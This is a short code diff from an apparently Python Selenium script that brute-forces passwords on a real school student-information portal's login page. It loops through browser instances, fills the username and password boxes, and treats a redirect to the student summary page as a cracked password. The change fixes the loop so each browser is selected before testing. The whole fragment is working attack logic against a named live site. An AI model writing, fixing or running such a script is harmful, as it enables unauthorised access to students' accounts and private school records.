@@ -38,6 +38,9 @@ j = 0
 while j < 500:
     j += 1
     for key in browserDict:
+
+        browser = browserDict[key] #Set the current browser to the one to test
+
         #conditional to test if the password is cracked
         if browser.current_url == ("https://sdm.sisk12.com/RP360x3/student360/studentSummary"):
             numDict[key] = int(numDict[key]) - 1 #This gets the user password, currently one excess set of iterations occur before the solution is caught
@@ -49,8 +52,6 @@ while j < 500:
 
             breakWhileLoop = True #Causes program to breaks out of upper while loop
             break #Break out of current loop
-
-        browser = browserDict[key] #Set the current browser to the one to test
 
         username = browser.find_element_by_id("txtUserName") #sets focus on the username text input box
         password = browser.find_element_by_id("txtPassword") #sets focus on the password text input box
